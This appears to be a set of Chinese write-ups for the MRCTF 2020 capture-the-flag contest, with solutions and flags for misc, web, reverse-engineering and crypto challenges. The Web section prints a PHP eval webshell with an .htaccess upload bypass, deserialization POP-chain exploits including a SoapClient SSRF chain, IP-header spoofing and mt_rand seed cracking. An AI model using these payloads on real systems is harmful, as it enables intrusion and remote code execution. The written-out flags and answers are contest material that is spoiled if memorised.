# MRCTF新生赛 2020


## Misc
### 不眠之夜
这是一个不能透露出题人信息的题目...
解法1：手动拼图（逃
解法2：写脚本拼图。通过一些方法（比如边缘的对应像素色差取平方和）计算边缘的相似度，对每个图片对象dfs其四周最相似的图片即可，复杂度(n^3)，2000多像素，常数不大，可以跑。
在使用PIL拼图的时候注意生成原图长宽二倍的图片，从中间一点开始扩展，可以保证不会越界。或者检测红色像素点位置，据此构造边缘特征也可以，但这样容易出现多个强连通分量的情况，最后还要手动拼
（算法dalao请务必把脚本发来看看
解法3：gayhub上的gaps工具。谷歌搜索jigsaw solver可以找到这个工具，两秒就跑出来了。
注意其参数`-size`代表了分割成正方形块的边长。显然应该取小拼图的长宽最大公因数100
![](https://ww1.yunjiexi.club/2020/03/28/mukAD.gif)

### Unravel
首先拿到后binwalk分离图片发现带有aes的Tokyo
然后查看.wav文件尾，发现密文。
利用密码解密的得到另一个.wav
通过silenteye解LSB隐写
得到flag。
### 飞来横财

```solidity
pragma solidity >=0.6.1;

contract Modcoin {
    mapping(uint256 => bool) public is_successful;
    function recvpay() public payable {
        require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), "Not Accepting These Coins.");
    }
    function getflag(uint256 target) public {
        require((address(this).balance / 0.001 ether ) % 2 == 1,"Not Wanted value");
        require(msg.sender.send(address(this).balance));
        is_successful[target] = true;
    }
    fallback () external payable {
        require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), "Not Accepting These Coins.");
    }
}

```
原合约中两个支付函数`recvpay()` 和 `fallback()` 都只允许接受偶数倍`0.001 ether`的付款，而合约的`getflag`函数则要求奇数倍 `0.001 ether` 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。
```solidity
contract Payassist {
    function destroy_pay(address payable addr) public payable {
        selfdestruct(addr);
    }
}
```

### pyflag

题目灵感：出题人感觉Misc很多题目有着相同的套路，想要尝试基于特征的隐写自动解决工具...于是就有了题目的最后一部分

拿到题目解压缩后发现三张图片。无论是使用strings命令，还是用16进制编辑器打开图片，都可以发现文件末尾隐藏了一些信息。strings会发现[Secret File Part 1-3]的标识，而16进制打开则发现文件尾的结束符并非jpg的标准结束符`FF D9`。

![](https://ww1.yunjiexi.club/2020/03/12/cliQk.md.png)

于是将这三段隐藏信息复制到16进制编辑器中，可以得到一个压缩包。
压缩包密码是弱密码1234

然后取得了一个flag.txt，.hint已经提示了使用base16,32,64,85的编码，可以编写自动化脚本来处理，也可以手动尝试。只加密了五层，手动尝试不会很耗费时间。编写py脚本这就需要正则表达式的知识，并掌握这些编码的正则特征。
如果你选择编写脚本解码，那么请注意使用的函数传入的参数是str（"Astring"）还是bytes(b"Astring")。字符流和字节流的区别也很重要，可以去了解一下，明确它们的区别可以让你在数据处理时更加熟练。

```python
#!/usr/bin/env python

import base64
import re

def baseDec(text,type):
    if type == 1:
        return base64.b16decode(text)
    elif type == 2:
        return base64.b32decode(text)
    elif type == 3:
        return base64.b64decode(text)
    elif type == 4:
        return base64.b85decode(text)
    else:
        pass

def detect(text):
    try:
        if re.match("^[0-9A-F=]+$",text.decode()) is not None:
            return 1
    except:
        pass
    
    try:
        if re.match("^[A-Z2-7=]+$",text.decode()) is not None:
            return 2
    except:
        pass

    try:
        if re.match("^[A-Za-z0-9+/=]+$",text.decode()) is not None:
            return 3
    except:
        pass
    
    return 4

def autoDec(text):
    while True:
        if b"MRCTF{" in text:
            print("\n"+text.decode())
            break

        code = detect(text)
        text = baseDec(text,code)

with open("flag.txt",'rb') as f:
    flag = f.read()

autoDec(flag)
```

顺便给出我的加密脚本

```python
#!/usr/bin/env python

import base64
import re

key = "31214"
# key本来非常长。。似乎太难了改的简单了点
# key = "14332234124133132214311231"
flag = b"MRCTF{Y0u_Are_4_p3rFect_dec0der}"

def baseEnc(text,type):
    if type == 1:
        return base64.b16encode(text)
    elif type == 2:
        return base64.b32encode(text)
    elif type == 3:
        return base64.b64encode(text)
    elif type == 4:
        return base64.b85encode(text)
    else:
        pass

def baseDec(text,type):
    if type == 1:
        return base64.b16decode(text)
    elif type == 2:
        return base64.b32decode(text)
    elif type == 3:
        return base64.b64decode(text)
    elif type == 4:
        return base64.b85decode(text)
    else:
        pass

def finalEnc(text,key):
    nf = text
    count = 1
    for i in key:
        nf = baseEnc(nf,int(i,10))
        #print("第"+str(count)+"次加密: ",nf)
        count +=1
    
    return nf

def finalDec(text,key):
    nf = text
    key = key[::-1]
    print(key)
    count = 1
    for i in key:
        nf = baseDec(nf,int(i,10))
        #print("第"+str(count)+"次解密: ",nf)
        count +=1
    
    return nf

def detect(text):

    try:
        if re.match("^[0-9A-F=]+$",text.decode()) is not None:
            return 1
    except:
        pass
    
    try:
        if re.match("^[A-Z2-7=]+$",text.decode()) is not None:
            return 2
    except:
        pass

    try:
        if re.match("^[A-Za-z0-9+/=]+$",text.decode()) is not None:
            return 3
    except:
        pass
    
    return 4

def autoDec(text):
    print("dec key:",end="")
    while True:
        if b"MRCTF{" in text:
            print("\n"+text.decode())
            break
        code = detect(text)
        text = baseDec(text,code)
        print(str(code),end="")


fe = finalEnc(flag,key)
with open("flag.txt",'w') as f:
    f.write(fe.decode())
'''
ff = finalDec(fe,key)
print(ff)
'''
ff = autoDec(fe)
```

最后flag就是`MRCTF{Y0u_Are_4_p3rFect_dec0der}`
### cyberpunk!
签到题。
改时间或者逆向都行。
但是昂哥加了个壳
估计大家都会去改时间吧23333。
### 千层套路 Write Up

主要考察python脚本编写能力

虽然是千层套娃但是为了不那么毒瘤其实只有两层

第一层，自动化解压zip

试几次就知道zip的解压密码都是对应名字，可以写脚本

```python
#coding=utf-8
import os
import zipfile


orginal_zip = "0573.zip"

while True:
    tag = orginal_zip
    orginal_zip = zipfile.ZipFile(orginal_zip)
    for contents in orginal_zip.namelist():
        password = contents[0:contents.find('.')]
    print password
    orginal_zip.setpassword(tag[:-4])
    try:
        orginal_zip.extractall()
    except:
        break
    if(len(tag)>6):
        os.system("rm "+tag)
    orginal_zip=password+".zip"
```

因为博客里有写过相应脚本，这里改了下，解压密码都是对应名字而不是压缩包里名字。有个可能的坑是如果不判断的话，程序跑完会自动把qr.zip也删了

然后第二层就是qr.txt

里面一堆

```
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
...
```

显然是像素点

用PIL库搞下

```python
#coding=utf-8
from PIL import Image

x = 200    #x坐标  通过对txt里的行数进行整数分
y = 200    #y坐标  x * y = 行数

im = Image.new("RGB", (x, y))
file = open('qr.txt')

for i in range(0, x):
    for j in range(0, y):
        line = file.readline()  #获取一行的rgb值
        line = line[:-2]
        line = line[1:]
        print line
        rgb = line.split(", ")  #分离rgb，文本中逗号后面有空格
        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))

im.save('flag.png')
```

拿到二维码，扫一下拿到flag

```
flag="MRCTF{ta01uyout1nreet1n0usandtimes}"
```
### **ezmisc**
下载附件得到一张png图片，在windows下能打开看到，拖进kali中会显示CRC error，由此可以推断

图片的宽度/高度有问题，又因为图片宽度有问题时在windows下无法正常打开图片，所以本题为图片

高度有问题，修改图片高度即可看到flag：`MRCTF{1ts_vEryyyyyy_ez!}`

附上有关CRC错误的隐写分析网址：https://www.bbsmax.com/A/gVdnlMVXJW/

ctfwiki中也有很详细的介绍：https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/
### 你能看懂音符吗
下载附件，解压时报错，放进winhex查看，发现rar文件头错误，将`6152`修改为`5261`后再解压，即

可得到一个word文档，打开后发现内容被隐藏，搜索word隐写可知其隐写方式，将被隐藏的内容显

示出来，得到一串音符，在线网址解密音符即可得到flag

word隐写方式（供参考）：https://blog.csdn.net/q_l_s/article/details/53813971

解密网址：https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue

flag：`MRCTF{thEse_n0tes_ArE_am@zing~}`



## Web
### PYWebsite

一道简单的前端trick题目，希望更多人注意到前端验证是不安全的。

首先过一遍业务逻辑，是购买授权码，再验证授权码的过程。自然想到审计验证过程的漏洞。点击按钮弹出窗口是js控制的，进而猜测验证逻辑处于前端，于是查看源代码发现逻辑如下:

![](https://ww1.yunjiexi.club/2020/03/12/cixcz.png)

不知道MD5？事实上我们根本不需要理会前端的验证，只需要直接跳转到flag.php即可。
（md5("ARandomString")）

进入flag.php，题目告诉我们只有特定的IP才能访问，并且是后端验证。事实上，应用层使用XFF验证IP也是没有意义的。PHP使用X-Forward-For这个http的请求头来验证，而这个请求头我们可以伪造。

我们不知道购买者的IP，但是知道“自己”的IP，也就是本地环回地址`127.0.0.1`。因此只需要用抓包软件抓到HTTP的请求包，进行修改（加入`X-Forwarded-For: 127.0.0.1`一行）就可以欺骗过验证逻辑。
最后的flag字体我调成了白色hhh 所以要多观察源代码
后端的验证逻辑一般如下：
```php
function checkXFF() {
  if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    if (strpos($ip, "127.0.0.1") !== false) {
      return true;
    }
  }
  return false;
}

```
顺便一提，如何验证用户的真实IP呢？确实不好办。因为用户可能使用代理（称为正向代理），我们的服务器因为业务需求，也会进行负载均衡等转发操作（称为反向代理）。但如果这个过程没有经过代理，一般使用Remote_Addr是可以获得真实IP的。
flag:`MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!}`

### Ez_bypass
很简单的bypass
第一步md5好多种绕过方法。
可以当数组，可以当md5碰撞，可以构造0e开头科学计数法。
第二步用语句绕过
1234567|1=1
即可得到flag
比较简单

### EzPop

主要考察对php魔术化方法的了解

提示里有参考资料，也是为了锻炼赛场上的自学能力吧

考点就这三个

#### 反序列化魔术方法

```php
__construct()//当一个对象创建时被调用
__destruct() //当一个对象销毁时被调用
__toString() //当一个对象被当作一个字符串使用
__sleep()//在对象在被序列化之前运行
__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
__get()//获得一个类的成员变量时调用
__set()//设置一个类的成员变量时调用
__invoke()//调用函数的方式调用一个对象时的回应方法
__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数
```

#### public、protected与private在序列化时的区别

protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。

#### BASE64 Wrapper LFI

``php://filter/convert.base64-encode/resource=flag.php``

Exp:

```php
<?php 

class Show{
	public $source;
	public $str;
}

class Test{
	public $p;
}

class Modifier{
	protected $var;
	function __construct(){
		$this->var="php://filter/convert.base64-encode/resource=flag.php";
	}
}

$s = new Show();
$t = new Test();
$r = new Modifier();
$t->p = $r;
$s->str = $t;
$s->source = $s;
var_dump(urlencode(serialize($s)));

?>
```

分析：

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);//8.触发这个include，利用php base64 wrapper 读flag
    }
    public function __invoke(){
        $this->append($this->var);//7.然后会调用到这里
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;//4.这里会调用str->source的__get 那么我们将其设置为Test对象
    }

    public function __wakeup(){//2.如果pop是个Show,那么调用这里
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {//3.匹配的时候会调用__toString
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;//5.触发到这里
        return $function();//6.()会调用__invoke,我们这里选择Modifier对象
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);//1.反序列调用这里
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

构造即可

### 套娃
在URL中GET请求当输入`.`或者` `(空格)或者`_`都会忽略，因此`b_u_p_t`,其实就是`b u p t`,正则的意思是必须要23333开头和结尾，但是值不能为23333，这个时候url的%0A为换行污染，可以绕过正则，且值不为23333。直接进入下一个套娃。jsfuck在控制器输出发现POST Merak。Post Merak=1即可查看源码。判断意图是模拟本地用户，这里我禁了XFF头，可以用Client-ip进行绕过即可，最后`file_get_contents`需要解密，exp如下
```php
<?php
function decode($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
} 
function en_code($value){
    $result = '';
    for($i=0;$i<strlen($value);$i++){
        $result .= chr(ord($value[$i]) - $i*2);
    }
    $result = base64_encode($result);
    return $result;
}
echo en_code("flag.php");
?>
```
### Ezaudit
index页面是一个啥也没用的页面，需要扫后台，发现存在login.php为空，考虑到可能是处理后端,前端则是`login.html`,发现是一个简单的登录框，只有登录框想到大概率存在源码泄露，发现`www.zip`文件，判断登录逻辑是sql查询，没有任何过滤，可以直接万能密码，还需要输入密钥，这里产生公钥和秘钥的机制都是使用mt_rand，而这是个伪随机数，可以进行破解，知道公钥后将公钥转化成`php_mt_seed`格式，`gayhub`直接git clone，得到种子后，再将其生成12位密钥即可，具体原理:https://blog.csdn.net/crisprx/article/details/104306971
exp:
```php
<?php
$str = "KVQP0LdJKRaV3n9D";
$randStr = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 
for($i=0;$i<strlen($str);$i++){
   $pos = strpos($randStr,$str[$i]);
   echo $pos." ".$pos." "."0 ".(strlen($randStr)-1)." ";
   //整理成方便 php_mt_seed 测试的格式
  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
}
echo "\n";
/**
 *爆破得到mt_srand = 1775196155
 */
mt_srand(1775196155);
function public_key($length = 16) {
  $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $public_key = '';
  for ( $i = 0; $i < $length; $i++ )
  $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
  return $public_key;
}
/**
 * 先生成一次公钥在生成一次密钥  XuNhoueCDCGc
 */
function private_key($length = 12) {
  $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $private_key = '';
  for ( $i = 0; $i < $length; $i++ )
  $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
  return $private_key;
}
echo public_key();
echo "\n";
echo private_key();
?>
```
### 你传你🐎呢

很经典的上传绕过，主要考察一下基本的上传绕过技能

利用BurpSuite修改MIME欺骗后端文件类型
修改
Content-Type: image/png
然后就可以传任意文件后缀
利用.htaccess来制作图片马

增加使用php解析的文件后缀(.jpg)

  AddType application/x-httpd-php .jpg

然后再写个一句话

```
<?php eval($_REQUEST['eki']);?>
```

用蚁剑连上就可以了

### Ezpop Revenge

主要考察CMS审计能力和SSRF的应用
顺着Typecho的源码搞的
从Github上克隆源码，发现1.2预览版还有1.1的POP链
改造了一下入口,然后套了SoapClient来SSRF

入口点
```php
//HelloWorld/Plugin.php
if (isset($_POST['C0incid3nc3'])) {
			if(preg_match("/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)
				unserialize(base64_decode($_POST['C0incid3nc3']));
			else {
				echo "Not that easy.";
			}
            //call_user_func("call_user_func",array($a,"233"));
        }
class HelloWorld_DB{
    private $flag="MRCTF{this_is_a_fake_flag}";
    private $coincidence;
    function  __wakeup(){
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
    }
}
```

路由点
```php
//Typecho/Plugin.php       
       Helper::addRoute("page_admin_action","/page_admin","HelloWorld_Plugin",'action');
```

Pop链可以参照Exp:

```php
<?php
class HelloWorld_DB{
    private $flag="MRCTF{this_is_a_fake_flag}";
    private $coincidence;
    function __construct($coincidence){
        $this->coincidence = $coincidence;
    }
    function  __wakeup(){
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
    }
}
class Typecho_Request{
    private $_params;
    private $_filter;
    function __construct($params,$filter){
        $this->_params=$params;
        $this->_filter=$filter;
    }
}
class Typecho_Feed{
    private $_type = 'ATOM 1.0';
    private $_charset = 'UTF-8';
    private $_lang = 'zh';
    private $_items = array();
    public function addItem(array $item){
        $this->_items[] = $item;
    }
}

$target = "http://127.0.0.1/flag.php";
$post_string = '';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'
);

$a = new SoapClient(null,array('location' => $target,
                                'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                'uri'      => "aaab"));

$payload1 = new Typecho_Request(array('screenName'=>array($a,"233")),array('call_user_func'));
$payload2 = new Typecho_Feed();
$payload2->addItem(array('author' => $payload1));
$exp1 = array('hello' => $payload2, 'world' => 'typecho');
$exp = new HelloWorld_DB($exp1);
echo serialize($exp)."\n";
echo urlencode(base64_encode(serialize($exp)));

```

可以分析内网地址
```php
<?php
if(!isset($_SESSION)) session_start();
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
   $_SESSION['flag']= "MRCTF{Cr4zy_P0p_4nd_RCE}";
}else echo "我扌your problem?\nonly localhost can get flag!";
?>
```
这也是为啥cookie要带session

用payload打一次刷新下页面var_dump()就会dumpflag出来了

## RE

### Xor(校内专供)
异或一次后的数据再异或一次即可得到原数据
将输入字符和序号进行异或，再与目标数组比较
所以只需要将目标数组反过来再次异或就可以得到flag
``` cpp
#include<cstdio>
#include<cstring>
#include<cstdlib>
char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67};
int main()
{
	for(int i=0;i<strlen(flag);i++)
	{
		unsigned char tmp=flag[i];
		tmp^=i;
		printf("%c",tmp);
	}
	return 0;
}


```
得到flag:MRCTF{@_R3@1ly_E2_R3verse!}

### Transform
其实就是个简单的字符置换，可以试试输入有规律的字符串，然后dump出处理过后的字符串
这样就知道置换矩阵了，拿出数据置换一下，异或一下就是flag。。

### 撸啊撸

这道题目其实题目名有很大的提示，lua lu
这个使用C++内嵌lua写的，不然为什么会显示"I need My friend to help me check your flag!"
只需要根据判断逻辑逆向思考，可以看出sub_7FF650AFD980是个很重要的函数
然后观察它的参数，发现出入了一个乱七八糟的字符串。
看不出来是啥，但是如果动调，就会发现这个字符串被修改了，看的懂了
``` Lua
cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97}
print("Give Me Your Flag LOL!:")
flag=io.read()
if string.len(flag)~=29 then
	print("Wrong flag!")
	os.exit()
end
for i=1,string.len(flag) do
	local x=string.byte(flag,i)
	if i%2==0 then
		x=x~i
	else
		x=x+6
	end
	if x~=cmps[i] then
		print("Wrong flag!")
		os.exit()
	end
	
end
print("Right flag!")
os.exit()

```
这里的~是异或的意思，就很容易看懂了
EXP
``` Python
a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97]
flag=""
for i in range(1,29):
	x=a[i-1]
	if i%2==0:
		x^=i
	else:
		x-=6
	flag+=chr(x)
print flag
```
### PixelShooter

这道题目使用了Unity写的个小游戏
表面上是apk，其实是个C#逆向
大部分的Unity都是用C#写的，其中有个存储逻辑代码的C#二进制文件
Assembly-Csharp.dll
所以只要找到这个玩意就是了
apk解包，PixelShooter.apk\assets\bin\Data\Managed下面就是了
dnspy打开
![](https://i.loli.net/2020/03/25/4o1ih7XCDgtVmlr.png)
即可在UIController下找到flag
MRCTF{Unity_1S_Fun_233}

### Junk

这道题如同其名字，Junk
往里面塞了很多JunkCode，只要一个个去掉就是了，U和C键交替(里面插了许多0xE8字节来迷惑IDA)
顺便把一些稀里糊涂的Call给删了(通过Call一个函数，函数里修改了EIP的值，进行跳转，这会导致F5分析失败)
![](https://i.loli.net/2020/03/25/wynAMXpQ3ulLGvB.png)
可以仔细分析一下，这里对输入进行了异或
然后实现了循环左移和右移的操作，鉴于位移四位，其实左移右移都是一样的
这里还有个奇怪的函数sub_B81090，对数据进行了奇怪的操作
点开看看
``` C++
char __fastcall sub_B81090(char *a1, int a2)
{
  int v2; // eax
  signed int v3; // esi
  int v4; // edi
  char v5; // al
  unsigned __int8 v6; // ah
  unsigned __int8 v7; // dh
  unsigned __int8 v8; // bh
  unsigned __int8 v9; // dl
  signed int v10; // eax
  bool v11; // cf
  unsigned __int8 v12; // cl
  int i; // ecx
  int v15; // [esp+8h] [ebp-14h]
  char v16; // [esp+10h] [ebp-Ch]
  char v17; // [esp+11h] [ebp-Bh]
  char v18; // [esp+12h] [ebp-Ah]
  char v19; // [esp+13h] [ebp-9h]
  unsigned __int8 v20; // [esp+14h] [ebp-8h]
  unsigned __int8 v21; // [esp+15h] [ebp-7h]
  unsigned __int8 v22; // [esp+16h] [ebp-6h]
  unsigned __int8 v23; // [esp+1Bh] [ebp-1h]

  v2 = a2;
  v3 = 0;
  v4 = 0;
  if ( a2 )
  {
    do
    {
      v15 = v2 - 1;
      v5 = *a1++;
      *(&v20 + v3++) = v5;
      v6 = v22;
      v7 = v21;
      v8 = v20;
      v23 = v22;
      if ( v3 == 3 )
      {
        v9 = (v22 >> 6) + 4 * (v21 & 0xF);
        v17 = (v21 >> 4) + 16 * (v20 & 3);
        v18 = (v22 >> 6) + 4 * (v21 & 0xF);
        v19 = v22 & 0x3F;
        v16 = v20 >> 2;
        byte_BA1708[v4] = byte_B9EA00[v20 >> 2];
        byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 >> 4) + 16 * (v8 & 3))];
        byte_BA170A[v4] = byte_B9EA00[v9];
        byte_BA170B[v4] = byte_B9EA00[v6 & 0x3F];
        v4 += 4;
        v3 = 0;
      }
      v2 = v15;
    }
    while ( v15 );
    if ( v3 )
    {
      v10 = v3;
      if ( v3 >= 3 )
      {
        v12 = v23;
      }
      else
      {
        v11 = (unsigned int)v3 < 3;
        do
        {
          if ( !v11 )
          {
            sub_B8150A(a1);
            JUMPOUT(*(_DWORD *)algn_B811F3);
          }
          *(&v20 + v10++) = 0;
          v11 = (unsigned int)v10 < 3;
        }
        while ( v10 < 3 );
        v12 = v22;
        v7 = v21;
        v8 = v20;
      }
      v16 = v8 >> 2;
      v17 = (v7 >> 4) + 16 * (v8 & 3);
      LOBYTE(v2) = v12 >> 6;
      v19 = v12 & 0x3F;
      v18 = (v12 >> 6) + 4 * (v7 & 0xF);
      for ( i = 0; i < v3 + 1; ++v4 )
      {
        v2 = (unsigned __int8)*(&v16 + i++);
        LOBYTE(v2) = byte_B9EA00[v2];
        byte_BA1708[v4] = v2;
      }
      if ( v3 < 3 )
        LOBYTE(v2) = sub_B822E0(&byte_BA1708[v4], 46, 3 - v3);
    }
  }
  return v2;
}
```
不难发现就是个base64变种，不过就是把表换了一下，等于号换成点而已
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&*(+/
最后在和已有字符串比较
所以思路很简单: 解变种base64->循环左移4位->异或3->得到flag
EXP
``` Python
import base64
orig="%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w.."
orig=orig.replace(')','0')
orig=orig.replace('!','1')
orig=orig.replace('@','2')
orig=orig.replace('#','3')
orig=orig.replace('$','4')
orig=orig.replace('%','5')
orig=orig.replace('^','6')
orig=orig.replace('&','7')
orig=orig.replace('*','8')
orig=orig.replace('(','9')
orig=orig.replace('.','=')
print orig
code=base64.b64decode(orig).encode('hex')
flag=""
for x in range(0,len(code),2):
	num=int(code[x:x+2],16)
	num=(((num>>4)&0xff) | ((num<<4)&0xff))
	flag+=chr(num^3)
print flag
```
MRCTF{junkjunkjunkcodejunkjunkcodejunkcode}

### EasyCPP

程序运用了较多的C++特性
所以代码看起来会比较冗杂，好在给了符号
总体上是要输入9个数字，并存入了Vector
![](https://i.loli.net/2020/03/25/5xQuETaI1vhwWCL.png)
然后通过lambda表达式进行了每个数字异或1的操作，然后对结果调用了个depart的函数
得到一个string的结果，最后和原有的9个奇怪字符串比较
![](https://i.loli.net/2020/03/25/9L8kPIFEsxQneK2.png)
最后输出九个数字拼起来的字符串，flag就是要把这九个数字拼起来进行md5校验后包起来
![](https://i.loli.net/2020/03/25/y3T6WJqzQXSlcLI.png)

然后来分析下depart函数和那个负责替换的lambda表达式
``` C++
__int64 __fastcall depart(int a1, __int64 a2, double a3)
{
  char v4; // [rsp+20h] [rbp-60h]
  char v5; // [rsp+40h] [rbp-40h]
  int i; // [rsp+68h] [rbp-18h]
  int v7; // [rsp+6Ch] [rbp-14h]

  v7 = a1;
  for ( i = 2; ; ++i )
  {
    std::sqrt<int>((unsigned int)a1); //枚举到根号n
    if ( a3 < (double)i )
      break;
    if ( !(a1 % i) )  //能分解就分解
    {
      v7 = i;
      depart((unsigned int)(a1 / i), a2); //递归分解
      break;
    }
  }
  std::__cxx11::to_string((std::__cxx11 *)&v5, v7); //将数字转为字符串以空格为间隔符合并起来
  std::operator+<char,std::char_traits<char>,std::allocator<char>>(&v4, &unk_500C, &v5);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=(a2, &v4);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v4);
  return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v5);
}
```
最后那个比较函数其实就是
```
replace(a.begin(),a.end(),'0','O');
replace(a.begin(),a.end(),'1','l');
replace(a.begin(),a.end(),'2','z');
replace(a.begin(),a.end(),'3','E');
replace(a.begin(),a.end(),'4','A');
replace(a.begin(),a.end(),'5','s');
replace(a.begin(),a.end(),'6','G');
replace(a.begin(),a.end(),'7','T');
replace(a.begin(),a.end(),'8','B');
replace(a.begin(),a.end(),'9','q');
replace(a.begin(),a.end(),' ','=');
```
![](https://i.loli.net/2020/03/25/1H6aydCUB3XWnbD.png)
将这些东西替换回数字，再把这些数字乘起来，再异或1一下就是输入的九个数字
```
2345
1222
5774
2476
3374
9032
2456
3531
6720
MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3}
```

### Shit

这道题目是临时出的，其实只要过掉开局的一个死循环，也可以attach，然后dump出密钥
就可以直接进行解密了，解密算法其实就是加密算法的逆向过程，全是位运算
``` C++
//key就是密钥 请直接dump
unsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279};
void decode()
{
	unsigned int k=0,bk=0;
	for(int i=5;i>=0;i--)
		if(i>0)
			ks[i]^=ks[i-1];
	for(int i=0;i<24;i+=4)
	{
		k=ks[i/4];
		k=(1<<key[i/4])^k;
		k=((k>>16)) | ((~(k<<16))&0xffff0000);
		k=((k<<key[i/4])) | (k>>(32-key[i/4]));
		printf("%X\n",k);
	}
}
```
解密出六个int，直接转ascii就是flag

### Virtual Tree

这道题静态分析完全就是错的，因为我在main函数运行前会将一些函数给替换掉
所以静态分析完全失败的，但是似乎大部分人都是动调2333
``` C++
int replace() //开局替换函数代码，
{
	void *addr=doit;
	int val=(int)addr;
	DWORD old;
	if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL)
		exit(0);
	int count=0;
	while(*((PBYTE)val)!=0x90)
	{
		if(*((PDWORD)val)==0x00401510)
			*((PDWORD)val)=(DWORD)list[count++]; //将一个全是同一个call的函数替换成不一样的函数
		val=val+1;
	}
	addr=main;
	val=(int)addr;
	if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL)
		exit(0);
	while(*((PBYTE)val)!=0x90)
	{
		if(*((PDWORD)val)==(DWORD)walkB)
		{
			*((PDWORD)val)=(DWORD)walkA; //加密代码的替换
			break;
		}
		val=val+1;
	}
}
```
所以，需要动调来看代码，代码才是对的。。
``` C++
int sub_12F16F0() //具体操作就是这些加减 异或
{
  Add(0, 10);
  Xor(1, 2);
  Add(2, 7);
  Sub_abs(3, 7);
  Xor(4, 5);
  Sub_abs(6, 1);
  Add(7, 3);
  Xor(8, 7);
  Sub_abs(9, 8);
  Sub_abs(10, 7);
  Xor(11, 12);
  Sub_abs(12, 2);
  Xor(14, 15);
  return Add(15, 2);
}
```
还有一个函数对输入进行了异或，dump出来就是了。。
所以只需要将数据按照sub_12F16F0()解方程之后，在异或dump出来的数据就可以得到flag了
@_7r3e_f0r_fuNN!

## Crypto
### keyboard
其实就是手机键盘
每行代表当个数字键盘上的字母摁一次就是第一个
以此类推。
### 天干地支+甲子
查找到天干地支图，发现每个都对应着数字，然后甲子是60，把每个都加上
60后用ascii码转下就可以了
### babyRSA
这题本身除了RSA考点外，还考察了模平方算法，那个Q如果硬怼是怼不出来的，必须模平方，至于模平方算法代码网上蛮多，我这就不贴了
